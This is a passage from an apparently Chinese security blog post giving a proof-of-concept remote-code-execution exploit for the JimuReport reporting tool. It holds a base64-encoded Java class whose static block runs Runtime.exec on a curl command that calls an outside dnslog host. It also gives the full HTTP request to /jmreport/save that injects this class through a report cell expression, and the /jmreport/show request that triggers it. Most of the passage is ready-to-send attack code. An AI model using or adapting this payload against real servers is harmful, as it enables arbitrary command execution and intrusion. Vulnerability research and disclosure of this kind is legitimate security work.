+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">javac编译，然后base64编码字节码：</p></div><div class="el-pre"><pre><code data-line="0">yv66vgAAADQAKQoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAgBwAhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACIBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAdAQAKU291cmNlRmlsZQEACnRlc3QxLmphdmEMAAoACwcAIwwAJAAlAQAjY3VybCBqZWVjZy5lN2I3MDBjMS5sb2cuZG5zbG9nLmJpei4MACYAJwEAE2phdmEvaW8vSU9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwACgAoAQAFdGVzdDEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAABAABAAoACwABAAwAAAAhAAEAAQAAAAUqtwABsQAAAAEADQAAAAoAAgAAAAkABAAKAAEADgAPAAIADAAAABkAAAADAAAAAbEAAAABAA0AAAAGAAEAAAANABAAAAAEAAEAEQABAA4AEgACAAwAAAAZAAAABAAAAAGxAAAAAQANAAAABgABAAAAEAAQAAAABAABABEACAATAAsAAQAMAAAAVAADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAIADQAAABYABQAAABQACQAXAAwAFQANABYAFgAYABQAAAAHAAJMBwAVCQABABYAAAACABc=
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">最终poc：</p></div><div class="el-pre"><pre><code data-line="0">POST /jmreport/save?previousPage=xxx&amp;jmLink=YWFhfHxiYmI=&amp;token=123 HTTP/1.1
+Host: 192.168.171.1:8085
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: application/json, text/plain, */*
+Content-Type: application/json
+Content-Length: 3456
+
+{
+    "loopBlockList": [],
+    "area": false,
+    "printElWidth": 718,
+    "excel_config_id": "980882669965455363",
+    "printElHeight": 1047,
+    "rows": {
+        "4": {
+            "cells": {
+                "4": {
+                    "text": "=(use org.springframework.cglib.core.*;use org.springframework.util.*;ReflectUtils.defineClass('test1', Base64Utils.decodeFromString('yv66vgAAADQAKQoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAgBwAhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACIBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAdAQAKU291cmNlRmlsZQEACnRlc3QxLmphdmEMAAoACwcAIwwAJAAlAQAjY3VybCBqZWVjZy5lN2I3MDBjMS5sb2cuZG5zbG9nLmJpei4MACYAJwEAE2phdmEvaW8vSU9FeGNlcHRpb24BABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgwACgAoAQAFdGVzdDEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAABAABAAoACwABAAwAAAAhAAEAAQAAAAUqtwABsQAAAAEADQAAAAoAAgAAAAkABAAKAAEADgAPAAIADAAAABkAAAADAAAAAbEAAAABAA0AAAAGAAEAAAANABAAAAAEAAEAEQABAA4AEgACAAwAAAAZAAAABAAAAAGxAAAAAQANAAAABgABAAAAEAAQAAAABAABABEACAATAAsAAQAMAAAAVAADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAIADQAAABYABQAAABQACQAXAAwAFQANABYAFgAYABQAAAAHAAJMBwAVCQABABYAAAACABc='), ClassLoader.getSystemClassLoader());)",
+                    "style": 0
+                }
+            },
+            "height": 25
+        },
+        "len": 96,
+        "-1": {
+            "cells": {
+                "-1": {
+                    "text": "${gongsi.id}"
+                }
+            },
+            "isDrag": true
+        }
+    },
+    "dbexps": [],
+    "toolPrintSizeObj": {
+        "printType": "A4",
+        "widthPx": 718,
+        "heightPx": 1047
+    },
+    "dicts": [],
+    "freeze": "A1",
+    "dataRectWidth": 701,
+    "background": false,
+    "name": "sheet1",
+    "autofilter": {},
+    "styles": [
+        {
+            "align": "center"
+        }
+    ],
+    "validations": [],
+    "cols": {
+        "4": {
+            "width": 95
+        },
+        "len": 50
+    },
+    "merges": [
+        "E4:F4",
+        "B4:B5",
+        "C4:C5",
+        "D4:D5",
+        "G4:G5",
+        "H4:H5",
+        "I4:I5",
+        "D1:G1",
+        "H3:I3"
+    ]
+}
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-pre"><pre><code data-line="0">POST /jmreport/show?previousPage=xxx&amp;jmLink=YWFhfHxiYmI= HTTP/1.1
+Host: 192.168.171.1:8085
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: application/json, text/plain, */*
+Content-Type: application/json
+Content-Length: 38
+
+{
+    "id": "980882669965455363"
+}
+</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">发送poc</p></div><div class="el-p"><p dir="auto"><a data-tooltip-position="top" aria-label="https://img2024.cnblogs.com/blog/2855436/202409/2855436-20240902143728779-731318729.png" rel="noopener nofollow" class="external-link is-unresolved" href="https://img2024.cnblogs.com/blog/2855436/202409/2855436-20240902143728779-731318729.png" target="_self"><img src="https://img2024.cnblogs.com/blog/2855436/202409/2855436-20240902143728779-731318729.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"></a></p></div><div class="el-p"><p dir="auto">成功请求dnslog</p></div><div class="el-p"><p dir="auto"><a data-tooltip-position="top" aria-label="https://img2024.cnblogs.com/blog/2855436/202409/2855436-20240902143733824-315943292.png" rel="noopener nofollow" class="external-link is-unresolved" href="https://img2024.cnblogs.com/blog/2855436/202409/2855436-20240902143733824-315943292.png" target="_self"><img src="https://img2024.cnblogs.com/blog/2855436/202409/2855436-20240902143733824-315943292.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"></a></p></div><div class="el-p"><p dir="auto">__EOF__</p></div><div class="el-p"><p dir="auto"><a data-tooltip-position="top" aria-label="https://pic.cnblogs.com/avatar/2855436/20220424175802.png" rel="noopener nofollow" class="external-link is-unresolved" href="https://pic.cnblogs.com/avatar/2855436/20220424175802.png" target="_self"><img src="https://pic.cnblogs.com/avatar/2855436/20220424175802.png" referrerpolicy="no-referrer" target="_self" class="is-unresolved"></a></p></div><div class="el-ul"><ul class="has-list-bullet">
+<li data-line="0" dir="auto"><span class="list-bullet"></span><strong>本文作者：</strong> <a data-tooltip-position="top" aria-label="https://www.cnblogs.com/CVE-Lemon" rel="noopener nofollow" class="external-link is-unresolved" href="https://www.cnblogs.com/CVE-Lemon" target="_self">柠檬i</a></li>
+<li data-line="1" dir="auto"><span class="list-bullet"></span><strong>本文链接：</strong> <a rel="noopener nofollow" class="external-link is-unresolved" href="https://www.cnblogs.com/CVE-Lemon/p/18392679" target="_self">https://www.cnblogs.com/CVE-Lemon/p/18392679</a></li>
+<li data-line="2" dir="auto"><span class="list-bullet"></span><strong>关于博主：</strong> 评论和私信会在第一时间回复。或者 <a data-tooltip-position="top" aria-label="https://msg.cnblogs.com/msg/send/CVE-Lemon" rel="noopener nofollow" class="external-link is-unresolved" href="https://msg.cnblogs.com/msg/send/CVE-Lemon" target="_self">直接私信</a> 我。</li>
+<li data-line="3" dir="auto"><span class="list-bullet"></span><strong>版权声明：</strong> 本博客所有文章除特别声明外，均采用 <a data-tooltip-position="top" aria-label="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener nofollow" class="external-link is-unresolved" title="BY-NC-SA" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_self">BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+<li data-line="4" dir="auto"><span class="list-bullet"></span><strong>声援博主：</strong> 如果您觉得文章对您有帮助，可以点击文章右下角 <strong>【推荐】</strong> 一下。</li>
+</ul></div><div class="footer"><div class="data-bar"></div></div></div></div></div><div id="right-content" class="leaf" style="--sidebar-width: var(--sidebar-width-right);"></div></div></div></body></html>
